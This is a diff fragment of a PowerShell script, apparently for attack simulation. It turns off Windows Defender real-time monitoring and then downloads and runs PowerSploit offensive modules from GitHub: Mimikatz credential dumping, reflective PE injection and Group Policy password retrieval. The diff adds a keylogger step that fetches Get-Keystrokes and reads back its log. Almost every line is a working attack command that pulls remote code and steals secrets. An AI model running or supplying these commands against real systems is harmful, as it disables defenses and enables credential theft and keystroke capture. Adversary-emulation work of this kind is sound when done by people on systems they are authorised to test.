@@ -3,8 +3,12 @@ Set-MPPreference -DisableRealtimeMonitoring $true
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 -usebasicparsing)
 Invoke-Mimikatz
 
+iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1)
+Get-Keystrokes
+cat $env:temp\key.log
+
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 -usebasicparsing)
-$PEBytes =Get-Content notepad.exe -Encoding Byte -Raw
+$PEBytes = Get-Content notepad.exe -Encoding Byte -Raw
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString
 
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)
